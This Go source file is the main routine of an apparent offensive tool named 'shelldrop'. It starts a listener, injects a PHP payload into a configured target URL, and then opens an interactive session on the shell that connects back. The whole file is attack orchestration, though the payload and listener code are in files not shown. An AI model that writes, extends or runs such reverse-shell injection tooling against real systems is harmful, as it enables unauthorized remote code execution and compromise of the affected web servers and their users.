package main

import (
	"context"
	"fmt"
	"os"
	"shelldrop/log"
)

func main() {
	cfg := ParseConfig()

	ctx, cancel := context.WithCancel(context.Background())

	listener := NewListener(cfg.Listener, cancel)
	if err := listener.Start(); err != nil {
		fmt.Printf("[-] Error starting listener: %v\n", err)
		os.Exit(1)
	}
	defer listener.Close()

	injector := NewInjector("php_1").
		WithListenerConfig(cfg.Listener).
		WithUrl(cfg.Request.Url)

	if err := injector.Do(ctx); err != nil {
		log.Fatalf("Failed to inject payload: %v", err)
	}

	if err := listener.Interact(); err != nil {
		fmt.Printf("[-] Error during interaction: %v\n", err)
		os.Exit(1)
	}
}
